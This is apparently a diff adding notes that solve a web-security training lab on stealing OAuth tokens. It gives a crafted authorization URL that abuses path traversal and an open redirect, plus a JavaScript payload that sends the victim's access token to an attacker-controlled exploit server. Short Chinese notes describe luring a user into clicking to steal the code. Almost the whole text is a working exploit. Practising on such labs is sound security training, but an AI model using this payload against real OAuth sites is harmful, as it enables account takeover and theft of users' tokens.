@@ -1,0 +1,15 @@
+https://oauth-0aa20047034ca44d81d1d7ec029b008a.oauth-server.net/auth?client_id=jmcqweqak342sqlfn0g73&redirect_uri=https://0a1600b20392a4be8119d91200700080.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a39006f0397a4068105d87501460030.exploit-server.net/exploit&response_type=token&nonce=-1261095100&scope=openid%20profile%20email
+
+
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0aa20047034ca44d81d1d7ec029b008a.oauth-server.net/auth?client_id=jmcqweqak342sqlfn0g73&redirect_uri=https://0a1600b20392a4be8119d91200700080.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a39006f0397a4068105d87501460030.exploit-server.net/exploit&response_type=token&nonce=-1261095100&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+
+找到网站一处开放重定向，
+利用重定向，把redirect_url指向我们的网站，让授权服务器返回code到攻击服务器上
+
+诱使用户点击我们的脚本，来窃取code
